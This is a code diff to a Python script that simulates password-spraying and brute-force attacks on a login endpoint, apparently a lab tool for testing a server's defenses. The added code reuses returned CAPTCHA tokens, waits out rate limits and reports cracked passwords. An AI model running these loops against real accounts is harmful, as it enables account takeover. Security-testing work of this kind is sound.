@@ -3,7 +3,7 @@ attacks.py
 Attack simulation methods for testing authentication server security.
 """
 
-from typing import List
+from typing import List, Optional
 import requests
 import json
 import time
@@ -12,7 +12,7 @@ import attacks_const as const
 def load_passwords_from_file(file_path: str = None) -> List[str]:
     """
     Load passwords from JSON file.
-    
+
     :param file_path: Path to passwords JSON file (defaults to const.PASSWORDS_FILE_PATH)
     :return: List of passwords
     """
@@ -21,53 +21,151 @@ def load_passwords_from_file(file_path: str = None) -> List[str]:
 
     with open(file_path, 'r', encoding='utf-8') as f:
         passwords = json.load(f)
-        
+
         print(f"[*] Loaded {len(passwords)} passwords from {file_path}")
         return passwords
-    
+
+
+def handle_defense_response(
+    session: requests.Session,
+    server_url: str,
+    username: str,
+    password: str,
+    response: requests.Response,
+    endpoint: str = "/login"
+) -> Optional[requests.Response]:
+    """
+    Handle defense mechanism responses from the server.
+
+    Handles:
+    - CAPTCHA: Extracts token and retries with it
+    - Rate limiting: Waits for retry_after seconds and retries
+    - Account lockout: Returns None to signal account is locked
+    - TOTP: Returns response as-is (password is correct but TOTP required)
+
+    :param session: requests.Session object
+    :param server_url: Base URL of the server
+    :param username: Username being attempted
+    :param password: Password being attempted
+    :param response: Response object from the initial request
+    :param endpoint: Login endpoint
+    :return: Final response after handling defenses, or None if unable to proceed
+    """
+    try:
+        data = response.json()
+    except:
+        return response
+
+    # Handle CAPTCHA required
+    if data.get("captcha_required"):
+        captcha_token = data.get("captcha_token")
+        print(f"[!] CAPTCHA required for '{username}' - token: {captcha_token}")
+
+        # Retry with CAPTCHA token
+        print(f"[*] Retrying with CAPTCHA token...")
+        retry_response = session.post(
+            f"{server_url}{endpoint}",
+            json={
+                "username": username,
+                "password": password,
+                "captcha_token": captcha_token
+            }
+        )
+        # Recursively handle any additional defenses
+        return handle_defense_response(session, server_url, username, password, retry_response, endpoint)
+
+    # Handle rate limiting
+    if data.get("retry_after") is not None:
+        retry_after = data.get("retry_after")
+        print(f"[!] Rate limited for '{username}' - retry after {retry_after:.2f} seconds")
+        print(f"[*] Waiting {retry_after:.2f} seconds...")
+        time.sleep(retry_after)
+
+        # Retry after waiting
+        retry_response = session.post(
+            f"{server_url}{endpoint}",
+            json={"username": username, "password": password}
+        )
+        # Recursively handle any additional defenses
+        return handle_defense_response(session, server_url, username, password, retry_response, endpoint)
+
+    # Handle account lockout
+    if data.get("locked_until_seconds") is not None:
+        locked_seconds = data.get("locked_until_seconds")
+        print(f"[!] Account '{username}' is locked for {locked_seconds} seconds")
+        print(f"[!] Skipping this account (too long to wait)")
+        return None
+
+    # Handle TOTP required
+    if data.get("totp_required"):
+        print(f"[!] TOTP required for '{username}' - cannot bypass in automated attack")
+        print(f"[+] Password is correct, but TOTP is enabled")
+        return response
+
+    # No special defense handling needed
+    return response
+
+
 def password_spraying(
     server_url: str,
     usernames: List[str],
     endpoint: str = "/login",
+    password_limit: int = const.DEFAULT_PASSWORD_LIMIT,
 ):
     """
     Simulate a password spraying attack.
-    
+
     Tries common passwords against multiple user accounts. This attack avoids
     account lockout by trying one password against many users before moving
     to the next password.
-    
+
     :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
     :param usernames: List of usernames to target
-    :param passwords: List of passwords to try (defaults to COMMON_PASSWORDS)
+    :param endpoint: Login endpoint to target
+    :param password_limit: Maximum number of passwords to try (None for no limit)
     """
     passwords = load_passwords_from_file()
-    
+
+    # Limit the number of passwords if specified
+    if password_limit is not None:
+        passwords = passwords[:password_limit]
+
     print(f"[*] Starting password spraying attack")
-    print(f"[*] Target: {server_url}/{endpoint}")
+    print(f"[*] Target: {server_url}{endpoint}")
     print(f"[*] Testing {len(passwords)} passwords against {len(usernames)} users")
     print(f"[*] Total attempts: {len(passwords) * len(usernames)}")
     session = requests.Session()
     # Try each password against all users
     for password in passwords:
         print(f"\n[*] Trying password: '{password}'")
-        
+
         for username in usernames:
             try:
-                print(f"\n[*] Trying user: '{username}'")
+                print(f"[*] Trying user: '{username}'")
                 response = session.post(
                     f"{server_url}{endpoint}",
                     json={"username": username, "password": password}
                 )
-                
-                if response.status_code == const.SERVER_SUCCESS:
-                    data = response.json()
+
+                # Handle defense mechanisms
+                final_response = handle_defense_response(
+                    session, server_url, username, password, response, endpoint
+                )
+
+                if final_response is None:
+                    # Account locked or other blocking condition
+                    continue
+
+                if final_response.status_code == const.SERVER_SUCCESS:
+                    data = final_response.json()
                     if data.get("status") == "success":
                         print(f"[+] SUCCESS! Username: '{username}' Password: '{password}'")
-                    
+                    elif data.get("totp_required"):
+                        print(f"[+] PASSWORD FOUND! Username: '{username}' Password: '{password}' (TOTP enabled)")
+
             except requests.exceptions.RequestException as e:
                 print(f"[!] Error connecting to server: {e}")
-    
+
     print(f"\n[*] Attack completed")
 
 
@@ -101,8 +199,8 @@ def brute_force_attack(
                 seen.add(pwd)
                 password_list.append(pwd)
     
-    login_url = f"{server_url}/{endpoint}"
-    
+    login_url = f"{server_url}{endpoint}"
+
     print(f"[*] Starting brute force attack")
     print(f"[*] Target: {server_url}")
     print(f"[*] Target username: '{target_username}'")
@@ -114,29 +212,39 @@ def brute_force_attack(
         if max_attempts and attempts >= max_attempts:
             print(f"\n[*] Reached maximum attempts limit ({max_attempts})")
             break
-        
+
         attempts += 1
-        
-        if i % 10 == 0:
-            print(f"[*] Progress: {i}/{len(password_list)} attempts...")
-        
         try:
             response = session.post(
                 login_url,
                 json={"username": target_username, "password": password},
                 timeout=const.DEFAULT_TIMEOUT
             )
-            
-            if response.status_code == 200:
-                data = response.json()
+
+            # Handle defense mechanisms
+            final_response = handle_defense_response(
+                session, server_url, target_username, password, response, endpoint
+            )
+
+            if final_response is None:
+                # Account locked - cannot continue
+                print(f"\n[!] Account locked - attack cannot continue")
+                break
+
+            if final_response.status_code == const.SERVER_SUCCESS:
+                data = final_response.json()
                 if data.get("status") == "success":
                     print(f"\n[+] SUCCESS! Password found: '{password}'")
                     print(f"[+] Cracked {target_username} after {attempts} attempts")
                     return
-                
+                elif data.get("totp_required"):
+                    print(f"\n[+] PASSWORD FOUND! '{password}' (TOTP enabled)")
+                    print(f"[+] Cracked {target_username} password after {attempts} attempts")
+                    return
+
         except requests.exceptions.RequestException as e:
             print(f"[!] Error connecting to server: {e}")
-    
+
     print(f"\n[*] Attack completed")
     print(f"[*] Password NOT found after {attempts} attempts")
 
